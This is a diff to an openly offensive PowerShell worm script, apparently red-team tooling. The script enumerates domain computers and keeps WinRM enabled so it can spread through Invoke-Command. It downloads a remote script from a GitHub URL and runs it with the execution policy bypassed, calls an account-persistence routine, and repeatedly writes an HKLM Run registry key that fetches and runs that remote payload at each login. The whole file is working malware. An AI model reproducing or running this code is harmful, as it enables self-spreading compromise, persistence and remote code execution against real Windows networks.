@@ -3,7 +3,7 @@ $domainSystemInfo = get-adcomputer -filter * -Properties ipv4address | select ip
 
 
 
-if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService')){
+if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService/TableTextServiceDa.txt')){
     mkdir 'C:\Program Files (x86)\Windows NT\TableTextService'
     cd 'C:\Program Files (x86)\Windows NT\TableTextService'
     $WebClient = New-Object System.Net.WebClient
@@ -41,8 +41,9 @@ function keepWINRMAlive{
     }
 }
 function wormy{
-    accountPersist
+    
     while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
+    accountPersist
     [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
     Write-Output 'slither'
     Set-Service -Name WinRM -StartupType Automatic
@@ -57,14 +58,14 @@ function wormy{
                 if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
                     Invoke-Command -ScriptBlock {
                     $WebClient = New-Object System.Net.WebClient
-                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/EnumerateDomain.ps1","C:\Windows\worm.ps1")
+                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\worm.ps1")
                     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass
                     }
                 }
             }
             else{
                     $WebClient = New-Object System.Net.WebClient
-                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/EnumerateDomain.ps1","C:\Windows\worm.ps1")
+                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\worm.ps1")
                     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass   
             }
             }
@@ -86,15 +87,14 @@ start-job -ScriptBlock{
 start-job -ScriptBlock { 
     while(1 -eq 1){
         try{
-            New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-command -scriptblock {$alexander=invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 Invoke-Expression $alexander }' -NonInteractive -ExecutionPolicy Bypass"  -PropertyType "String"
+            New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-command -scriptblock { Invoke-Expression invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 }' -NonInteractive -ExecutionPolicy Bypass"  -PropertyType "String"
         
         }
         catch{
-            Set-Itemproperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-command -scriptblock {$alexander=invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 Invoke-Expression $alexander }' -NonInteractive -ExecutionPolicy Bypass"
+            Set-Itemproperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-command -scriptblock { Invoke-Expression invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 }' -NonInteractive -ExecutionPolicy Bypass"
         }
         start-sleep -Seconds (get-random -Minimum 5 -Maximum 10)
     }
 }
 
 wormy
-
